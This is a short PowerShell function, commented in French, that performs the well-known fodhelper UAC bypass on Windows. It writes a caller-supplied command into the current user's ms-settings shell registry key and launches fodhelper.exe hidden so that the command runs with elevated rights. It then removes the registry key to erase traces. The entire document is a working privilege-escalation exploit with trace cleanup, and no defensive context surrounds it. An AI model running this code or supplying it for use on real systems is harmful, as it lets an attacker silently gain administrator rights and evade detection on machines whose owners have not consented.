function FodhelperBypass {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true)]
        [string]$Command
    )

    $payload = 'cmd.exe /c start "" ' + $Command


    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $payload -Force

    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

    # Petite pause pour laisser le temps au process élevé de démarrer
    Start-Sleep -Seconds 3

    # Nettoie la clé de registre
    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
}
